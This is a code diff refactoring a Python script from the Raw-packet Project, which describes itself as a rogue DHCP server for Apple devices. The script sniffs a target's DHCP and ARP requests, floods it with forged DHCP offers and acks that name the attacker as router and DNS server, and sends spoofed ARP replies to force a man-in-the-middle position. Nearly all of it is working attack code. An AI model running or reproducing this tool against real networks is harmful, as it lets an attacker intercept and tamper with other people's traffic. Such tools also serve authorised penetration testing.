@@ -11,26 +11,13 @@ Copyright 2020, Raw-packet Project
 # endregion
 
 # region Import
-
-# region Add project root path
 from sys import path
 from os.path import dirname, abspath
-path.append(dirname(dirname(dirname(abspath(__file__)))))
-# endregion
-
-# region Raw-packet modules
-from raw_packet.Utils.base import Base
-from raw_packet.Utils.network import RawEthernet, RawARP, RawIPv4, RawUDP, RawDHCPv4
-from raw_packet.Utils.tm import ThreadManager
-# endregion
-
-# region Import libraries
 from sys import exit
 from argparse import ArgumentParser
 from socket import socket, AF_PACKET, SOCK_RAW, htons
 from time import sleep
-# endregion
-
+from datetime import datetime
 # endregion
 
 # region Authorship information
@@ -44,115 +31,50 @@ __email__ = 'ivanov.vladimir.mail@gmail.com'
 __status__ = 'Production'
 # endregion
 
-# region Check user, platform and create threads
-Base = Base()
-Base.check_user()
-Base.check_platform()
-tm = ThreadManager(3)
-# endregion
-
-# region Parse script arguments
-parser = ArgumentParser(description='Rogue DHCP server for Apple devices')
-parser.add_argument('-i', '--interface', help='Set interface name for send DHCP reply packets')
-parser.add_argument('-t', '--target_mac', help='Set target MAC address, required!', required=True)
-parser.add_argument('-I', '--target_ip', help='Set new client IP address, required!', required=True)
-parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
-args = parser.parse_args()
-# endregion
-
-# region Print banner if argument quit is not set
-if not args.quiet:
-    Base.print_banner()
-# endregion
-
-# region Set global variables
-eth: RawEthernet = RawEthernet()
-arp: RawARP = RawARP()
-ip: RawIPv4 = RawIPv4()
-udp: RawUDP = RawUDP()
-dhcp: RawDHCPv4 = RawDHCPv4()
-
-target_mac_address = str(args.target_mac).lower()
-target_ip_address = str(args.target_ip)
-transaction_id_global = 0
-requested_ip = None
-print_possible_mitm = False
-print_success_mitm = False
-# endregion
-
-# region Get your network settings
-if args.interface is None:
-    Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
-current_network_interface = Base.network_interface_selection(args.interface)
-
-your_mac_address = Base.get_interface_mac_address(current_network_interface)
-your_ip_address = Base.get_interface_ip_address(current_network_interface)
-your_netmask = Base.get_interface_netmask(current_network_interface)
-your_broadcast = Base.get_interface_broadcast(current_network_interface)
-# endregion
-
-# region Create raw socket
-SOCK = socket(AF_PACKET, SOCK_RAW)
-SOCK.bind((current_network_interface, 0))
-# endregion
-
-
-# region Make DHCP offer packet
-def make_dhcp_offer_packet(transaction_id, destination_ip=None):
-    if destination_ip is None:
-        destination_ip = "255.255.255.255"
-    return dhcp.make_response_packet(ethernet_src_mac=your_mac_address,
-                                     ethernet_dst_mac='ff:ff:ff:ff:ff:ff',
-                                     ip_src=your_ip_address,
-                                     ip_dst=destination_ip,
-                                     transaction_id=transaction_id,
-                                     your_client_ip=target_ip_address,
-                                     dhcp_message_type=2,
-                                     client_mac=target_mac_address,
-                                     dhcp_server_id=your_ip_address,
-                                     lease_time=600,
-                                     netmask=your_netmask,
-                                     router=your_ip_address,
-                                     dns=your_ip_address)
-# endregion
-
-
-# region Make DHCP ack packet
-def make_dhcp_ack_packet(transaction_id, destination_ip=None):
-    if destination_ip is None:
-        destination_ip = "255.255.255.255"
-    return dhcp.make_response_packet(ethernet_src_mac=your_mac_address,
-                                     ethernet_dst_mac='ff:ff:ff:ff:ff:ff',
-                                     ip_src=your_ip_address,
-                                     ip_dst=destination_ip,
-                                     transaction_id=transaction_id,
-                                     your_client_ip=target_ip_address,
-                                     client_mac=target_mac_address,
-                                     dhcp_server_id=your_ip_address,
-                                     lease_time=600,
-                                     netmask=your_netmask,
-                                     router=your_ip_address,
-                                     dns=your_ip_address,
-                                     dhcp_message_type=5)
-# endregion
-
 
 # region DHCP response sender
 def dhcp_response_sender():
-    # dhcp_response_socket = socket(AF_PACKET, SOCK_RAW)
-    # dhcp_response_socket.bind((current_network_interface, 0))
+    dhcp_response_raw_socket = socket(AF_PACKET, SOCK_RAW)
+    dhcp_response_raw_socket.bind((current_network_interface, 0))
 
-    offer_packet = make_dhcp_offer_packet(transaction_id_global)
-    ack_packet = make_dhcp_ack_packet(transaction_id_global)
+    if args.broadcast:
+        offer_packet = dhcp.make_offer_packet(ethernet_src_mac=your_mac_address,
+                                              ip_src=your_ip_address,
+                                              transaction_id=transaction_id_global,
+                                              your_client_ip=target_ip_address,
+                                              client_mac=target_mac_address)
 
-    while True:
+        ack_packet = dhcp.make_ack_packet(ethernet_src_mac=your_mac_address,
+                                          ip_src=your_ip_address,
+                                          transaction_id=transaction_id_global,
+                                          your_client_ip=target_ip_address,
+                                          client_mac=target_mac_address)
+    else:
+        offer_packet = dhcp.make_offer_packet(ethernet_src_mac=your_mac_address,
+                                              ethernet_dst_mac=target_mac_address,
+                                              ip_src=your_ip_address,
+                                              ip_dst=target_ip_address,
+                                              transaction_id=transaction_id_global,
+                                              your_client_ip=target_ip_address,
+                                              client_mac=target_mac_address)
+
+        ack_packet = dhcp.make_ack_packet(ethernet_src_mac=your_mac_address,
+                                          ethernet_dst_mac=target_mac_address,
+                                          ip_src=your_ip_address,
+                                          ip_dst=target_ip_address,
+                                          transaction_id=transaction_id_global,
+                                          your_client_ip=target_ip_address,
+                                          client_mac=target_mac_address)
+
+    start_time: datetime = datetime.now()
+    while (datetime.now() - start_time).seconds <= 15:
         # discover_packet = dhcp.make_discover_packet(ethernet_src_mac=your_mac_address,
         #                                             client_mac=eth.make_random_mac(),
-        #                                             host_name=Base.make_random_string(6))
+        #                                             host_name=base.make_random_string(6))
         # SOCK.send(discover_packet)
-        SOCK.send(offer_packet)
-        SOCK.send(ack_packet)
-        sleep(0.5)
+        dhcp_response_raw_socket.send(offer_packet)
+        dhcp_response_raw_socket.send(ack_packet)
+        sleep(0.01)
 # endregion
 
 
@@ -179,7 +101,7 @@ def reply(request):
 
         # region DHCP DECLINE
         if request['DHCPv4'][53] == 4:
-            Base.print_info("DHCP DECLINE from: ", target_mac_address, " transaction id: ", hex(transaction_id))
+            base.print_info("DHCP DECLINE from: ", target_mac_address, " transaction id: ", hex(transaction_id))
             if transaction_id_global != 0:
                 tm.add_task(dhcp_response_sender)
         # endregion
@@ -190,8 +112,8 @@ def reply(request):
             # region Get next DHCP transaction id
             if transaction_id != 0:
                 transaction_id_global = transaction_id + 1
-                Base.print_info("Current transaction id: ", hex(transaction_id))
-                Base.print_success("Next transaction id: ", hex(transaction_id_global))
+                base.print_info("Current transaction id: ", hex(transaction_id))
+                base.print_success("Next transaction id: ", hex(transaction_id_global))
             # endregion
 
             # region Get DHCP requested ip address
@@ -200,14 +122,14 @@ def reply(request):
             # endregion
 
             # region Print info message
-            Base.print_info("DHCP REQUEST from: ", target_mac_address, " transaction id: ", hex(transaction_id),
+            base.print_info("DHCP REQUEST from: ", target_mac_address, " transaction id: ", hex(transaction_id),
                             " requested ip: ", requested_ip)
             # endregion
 
             # region If requested IP is target IP - print Possible mitm success
             if requested_ip == target_ip_address:
                 if not print_possible_mitm:
-                    Base.print_warning("Possible MiTM success: ", target_ip_address + " (" + target_mac_address + ")")
+                    base.print_warning("Possible MiTM success: ", target_ip_address + " (" + target_mac_address + ")")
                     print_possible_mitm = True
             # endregion
 
@@ -228,7 +150,7 @@ def reply(request):
                 # endregion
 
                 # region Print info message
-                Base.print_info("ARP request from: ", arp_sender_mac_address, " \"",
+                base.print_info("ARP request from: ", arp_sender_mac_address, " \"",
                                 "Who has " + arp_target_ip_address + "? Tell " + arp_sender_ip_address, "\"")
                 # endregion
 
@@ -238,7 +160,7 @@ def reply(request):
                     # region If ARP target IP is target IP - print Possible mitm success
                     if arp_target_ip_address == target_ip_address:
                         if not print_possible_mitm:
-                            Base.print_warning("Possible MiTM success: ",
+                            base.print_warning("Possible MiTM success: ",
                                                target_ip_address + " (" + target_mac_address + ")")
                             print_possible_mitm = True
                     # endregion
@@ -252,7 +174,7 @@ def reply(request):
                                                       target_mac=arp_sender_mac_address,
                                                       target_ip=arp_sender_ip_address)
                         SOCK.send(arp_reply)
-                        Base.print_info("ARP response to:  ", arp_sender_mac_address, " \"",
+                        base.print_info("ARP response to:  ", arp_sender_mac_address, " \"",
                                         arp_target_ip_address + " is at " + your_mac_address,
                                         "\" (IPv4 address conflict)")
                     # endregion
@@ -262,7 +184,7 @@ def reply(request):
                 # region ARP target IP is your IP - MITM SUCCESS
                 if arp_target_ip_address == your_ip_address:
                     if not print_success_mitm:
-                        Base.print_success("MITM success: ", target_ip_address + " (" + target_mac_address + ")")
+                        base.print_success("MITM success: ", target_ip_address + " (" + target_mac_address + ")")
                         print_success_mitm = True
                     sleep(5)
                     exit(0)
@@ -275,6 +197,65 @@ def reply(request):
 # region Main function
 if __name__ == "__main__":
 
+    # region Raw-packet modules
+    path.append(dirname(dirname(dirname(abspath(__file__)))))
+    from raw_packet.Utils.base import Base
+    from raw_packet.Utils.network import RawEthernet, RawARP, RawIPv4, RawUDP, RawDHCPv4
+    from raw_packet.Utils.tm import ThreadManager
+    # endregion
+
+    # region Check user, platform and create threads
+    base = Base()
+    base.check_user()
+    base.check_platform()
+    tm = ThreadManager(3)
+    # endregion
+
+    # region Parse script arguments
+    parser = ArgumentParser(description='Rogue DHCP server for Apple devices')
+    parser.add_argument('-i', '--interface', help='Set interface name for send DHCP reply packets')
+    parser.add_argument('-m', '--target_mac', help='Set target MAC address, required!', required=True)
+    parser.add_argument('-t', '--target_new_ip', help='Set new client IP address, required!', required=True)
+    parser.add_argument('-b', '--broadcast', action='store_true', help='Send broadcast DHCPv4 responses')
+    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
+    args = parser.parse_args()
+    # endregion
+
+    # region Print banner if argument quit is not set
+    if not args.quiet:
+        base.print_banner()
+    # endregion
+
+    # region Set global variables
+    eth: RawEthernet = RawEthernet()
+    arp: RawARP = RawARP()
+    ip: RawIPv4 = RawIPv4()
+    udp: RawUDP = RawUDP()
+    dhcp: RawDHCPv4 = RawDHCPv4()
+
+    target_mac_address = str(args.target_mac).lower()
+    target_ip_address = str(args.target_new_ip)
+    transaction_id_global = 0
+    requested_ip = None
+    print_possible_mitm = False
+    print_success_mitm = False
+    # endregion
+
+    # region Get your network settings
+    if args.interface is None:
+        base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
+    current_network_interface = base.network_interface_selection(args.interface)
+    your_mac_address = base.get_interface_mac_address(current_network_interface)
+    your_ip_address = base.get_interface_ip_address(current_network_interface)
+    your_netmask = base.get_interface_netmask(current_network_interface)
+    your_broadcast = base.get_interface_broadcast(current_network_interface)
+    # endregion
+
+    # region Create raw socket
+    SOCK = socket(AF_PACKET, SOCK_RAW)
+    SOCK.bind((current_network_interface, 0))
+    # endregion
+
     # region Sniff network
 
     # region Create RAW socket for sniffing
@@ -282,7 +263,7 @@ if __name__ == "__main__":
     # endregion
 
     # region Print info message
-    Base.print_info("Waiting for a ARP or DHCP requests from: ", target_mac_address)
+    base.print_info("Waiting for a ARP or DHCP requests from: ", target_mac_address)
     # endregion
 
     # region Start sniffing
@@ -389,7 +370,7 @@ if __name__ == "__main__":
             # endregion
 
         except KeyboardInterrupt:
-            Base.print_info('Exit ....')
+            base.print_info('Exit ....')
             exit(0)
     # endregion
 
